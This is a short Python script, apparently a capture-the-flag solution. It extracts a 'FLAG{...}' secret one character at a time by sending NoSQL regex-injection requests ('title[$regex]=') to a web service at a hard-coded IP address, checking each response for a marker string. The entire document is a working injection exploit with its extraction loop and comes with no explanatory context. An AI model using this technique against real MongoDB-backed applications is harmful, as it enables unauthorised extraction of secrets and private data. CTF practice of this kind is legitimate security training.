import requests
import string

flag = 'FLAG{'
while '}' not in flag:
    for c in string.ascii_lowercase + string.ascii_uppercase + '_-{}' + string.digits:
        r = requests.get('http://78.128.216.18:65180/view?title[$regex]=%s' % (flag + c))
        if 'This is the flag post' in r.text:
            flag += c
            print(flag)
